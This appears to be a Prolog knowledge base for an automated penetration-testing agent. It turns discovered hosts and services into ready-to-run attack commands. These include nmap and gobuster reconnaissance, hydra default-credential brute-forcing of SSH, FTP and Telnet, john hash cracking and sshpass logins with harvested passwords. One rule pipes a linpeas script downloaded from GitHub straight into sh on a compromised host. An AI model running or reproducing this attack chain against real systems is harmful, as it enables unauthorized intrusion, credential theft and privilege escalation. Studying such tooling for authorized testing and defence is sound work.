:- discontiguous tool/2.
:- discontiguous profile/2.
:- dynamic executed/2.
:- dynamic connection/1.

tool(gobuster, http_dir_scan_small).
tool(gobuster, https_dir_scan_small).
tool(gobuster, http_dir_scan_big).
tool(gobuster, https_dir_scan_big).

profile(http_dir_scan_small, [ip=Ip, port=Port]) :- ip(Ip), deviceServices(Ip, Port, http), http_dir_scan_small([ip=Ip, port=Port], Command), \+executed(Command).
profile(https_dir_scan_small, [ip=Ip, port=Port]) :- ip(Ip), deviceServices(Ip, Port, https), https_dir_scan_small([ip=Ip, port=Port], Command), \+executed(Command).
profile(http_dir_scan_big, [ip=Ip, port=Port]) :- ip(Ip), deviceServices(Ip, Port, http), http_dir_scan_big([ip=Ip, port=Port], Command), \+executed(Command).
profile(https_dir_scan_big, [ip=Ip, port=Port]) :- ip(Ip), deviceServices(Ip, Port, https), https_dir_scan_big([ip=Ip, port=Port], Command), \+executed(Command).

http_dir_scan_small(Parameters, Command) :- 
	format_command("gobuster dir -u http://~w:~w/ -w wordlists/common.txt", [Parameters.ip, Parameters.port], Command). 

https_dir_scan_small(Parameters, Command) :- 
	format_command("gobuster dir -u https://~w:~w/ -w wordlists/common.txt", [Parameters.ip, Parameters.port], Command). 

http_dir_scan_big(Parameters, Command) :- 
	format_command("gobuster dir -u http://~w:~w/ -w wordlists/big.txt", [Parameters.ip, Parameters.port], Command). 

https_dir_scan_big(Parameters, Command) :- 
	format_command("gobuster dir -u https://~w:~w/ -w wordlists/big.txt", [Parameters.ip, Parameters.port], Command). 

tool(nmap, fast_scan).
tool(nmap, full_scan).

profile(fast_scan, [ip=Ip]) :- ip(Ip), fast_scan([ip=Ip], Command), \+executed(Command).
profile(full_scan, [ip=Ip]) :- ip(Ip), full_scan([ip=Ip], Command), \+executed(Command).

fast_scan(Parameters, Command) :- 
	format_command("nmap -F ~w", [Parameters.ip], Command). 

full_scan(Parameters, Command) :- 
	format_command("nmap -sC -sV -p- ~w", [Parameters.ip], Command). 

tool(linpeas, linpeas).

profile(linpeas, []) :- connection(connection), linpeas([], Command), \+executed(Command).

linpeas(Parameters, Command) :- 
	format_command("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh", [], Command). 

tool(firmwalker, firmware_analysis).

profile(firmware_analysis, [firmware=Firmware]) :- firmware(Firmware), firmware_analysis([firmware=Firmware], Command), \+executed(Command).

firmware_analysis(Parameters, Command) :- 
	format_command("", [], Command). 

tool(john, crack_hash).

profile(crack_hash, [hash=Hash]) :- passwordHash(Hash), crack_hash([hash=Hash], Command), \+executed(Command).

crack_hash(Parameters, Command) :- 
	format_command("echo ~w > pass; john pass --wordlist=/usr/share/wordlist/rockyou.txt ;john --show pass", [Parameters.hash], Command). 

tool(ssh, ssh_connection).

profile(ssh_connection, [account=Username, password=Password, ip=Ip]) :- ip(Ip), account(Username), password(Password), ssh_connection([account=Username, password=Password, ip=Ip], Command), \+executed(Command).

ssh_connection(Parameters, Command) :- 
	format_command("sshpass -p ~w ssh ~w@~w", [Parameters.password, Parameters.account, Parameters.ip], Command). 

tool(hydra, ssh_attack).
tool(hydra, ftp_attack).
tool(hydra, telnet_attack).

profile(ssh_attack, [ip=Ip, port=Port]) :- ip(Ip), deviceServices(Ip, Port, ssh), ssh_attack([ip=Ip, port=Port], Command), \+executed(Command).
profile(ftp_attack, [ip=Ip, port=Port]) :- ip(Ip), deviceServices(Ip, Port, ftp), ftp_attack([ip=Ip, port=Port], Command), \+executed(Command).
profile(telnet_attack, [ip=Ip, port=Port]) :- ip(Ip), deviceServices(Ip, Port, telnet), telnet_attack([ip=Ip, port=Port], Command), \+executed(Command).

ssh_attack(Parameters, Command) :- 
	format_command("hydra -C wordlists/default_credentials/test.txt ssh://~w:~w", [Parameters.ip, Parameters.port], Command). 

ftp_attack(Parameters, Command) :- 
	format_command("hydra -C wordlists/default_credentials/test.txt ftp://~w:~w", [Parameters.ip, Parameters.port], Command). 

telnet_attack(Parameters, Command) :- 
	format_command("hydra -C wordlists/default_credentials/test.txt telnet://~w:~w ", [Parameters.ip, Parameters.port], Command). 

